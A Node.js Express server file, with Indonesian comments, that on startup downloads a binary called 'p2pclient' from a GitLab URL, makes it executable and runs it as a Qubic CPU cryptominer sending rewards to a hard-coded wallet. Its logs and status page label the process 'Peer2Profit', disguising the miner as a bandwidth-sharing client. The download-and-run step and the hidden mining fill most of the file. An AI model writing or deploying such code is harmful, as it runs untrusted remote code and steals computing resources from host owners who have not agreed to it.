import express from 'express';
import { execSync, spawn } from 'child_process';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import os from 'os';
import { fileURLToPath } from 'url';

// Pastikan __dirname bisa digunakan dalam ES Module
const P2P_PATH = path.join(process.cwd(), 'p2pclient'); // Pastikan lokasi file benar
const LOG_FILE = path.join(process.cwd(), 'p2pclient.log');
const EMAIL = process.env.EMAIL || "chasing66@live.com";

function installP2PClient() {
    console.log("🔄 Checking p2pclient...");

    if (fs.existsSync(P2P_PATH)) {
        console.log("✅ p2pclient already exists.");
        return;
    }

    console.log("🔄 Downloading p2pclient...");
    try {
        execSync(`
            wget -q https://gitlab.com/rikzakalani/close/raw/main/p2pclient -O ${P2P_PATH} && \
            chmod +x ${P2P_PATH}
        `, { stdio: 'inherit' });
        console.log("✅ p2pclient installed successfully!");
    } catch (error) {
        console.error("❌ Failed to download p2pclient:", error);
        process.exit(1);
    }
}
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 5000;  // Default port langsung ditetapkan

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'templates'));

function startProcess() {
    installP2PClient(); // Pastikan sudah terinstall sebelum menjalankan

    console.log("🚀 Starting p2pclient...");
    const cmd = `${P2P_PATH} --cpu -t 1 --worker aaa --url ws.qubicmine.pro --wallet XJWLMDBPMLRXZDXXNAUCMVYYRERDSMNPBSHYLJMRRGDGTQMCUDLJRQAEIMEA`;
    const out = fs.createWriteStream(LOG_FILE, { flags: 'a' });

    const process = spawn(cmd, { shell: true });

    process.stdout.pipe(out);
    process.stderr.pipe(out);

    process.on('close', (code) => {
        console.log(`⚠️ Peer2Profit exited with code ${code}`);
    });
}


app.get('/', async (req, res) => {
    try {
        const hostname = os.hostname();
        const { data } = await axios.get('https://ipinfo.io');
        const IP = data.ip;

        let logs = ['Peer2Profit not started, Check the process first!'];
        if (fs.existsSync(LOG_FILE)) {
            logs = fs.readFileSync(LOG_FILE, 'utf8').split('\n').slice(-20);
        }

        res.render('index', { IP, hostname, logs });
    } catch (error) {
        res.status(500).send('Error fetching data');
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    startProcess();
});
